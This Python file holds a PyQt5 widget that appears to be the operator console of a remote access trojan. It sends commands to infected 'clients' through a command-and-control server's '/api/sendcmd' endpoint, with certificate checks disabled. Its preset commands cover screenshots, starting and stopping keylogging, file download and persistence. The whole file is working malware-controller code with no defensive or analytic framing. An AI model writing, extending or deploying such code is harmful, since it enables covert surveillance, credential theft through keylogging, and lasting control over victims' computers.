from PyQt5.QtWidgets import QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QTextEdit, QLabel, QComboBox
import requests

class CommandWidget(QWidget):
    def __init__(self, c2_url):
        super().__init__()
        self.c2_url = c2_url
        self.client_id = None
        layout = QVBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Enter command...")
        self.cmd_hist = QComboBox()
        self.cmd_hist.addItems(["screenshot", "keylog_start", "keylog_stop", "download file", "persist", "exit"])
        send_btn = QPushButton("Send")
        send_btn.clicked.connect(self.send)
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(QLabel("Command:"))
        layout.addWidget(self.cmd_hist)
        layout.addWidget(self.cmd_input)
        layout.addWidget(send_btn)
        layout.addWidget(QLabel("Output:"))
        layout.addWidget(self.output)
        self.setLayout(layout)

    def set_client(self, cid):
        self.client_id = cid
        self.output.append(f"Client selected: {cid}")

    def send(self):
        if not self.client_id:
            self.output.append("No client selected")
            return
        cmd = self.cmd_input.text() or self.cmd_hist.currentText()
        try:
            r = requests.post(f"{self.c2_url}/api/sendcmd", json={"client_id": self.client_id, "command": cmd}, verify=False)
            if r.status_code == 200:
                self.output.append(f"[Sent to {self.client_id}] {cmd}")
            else:
                self.output.append(f"Error: {r.text}")
        except Exception as e:
            self.output.append(f"Exception: {e}")
        self.cmd_input.clear()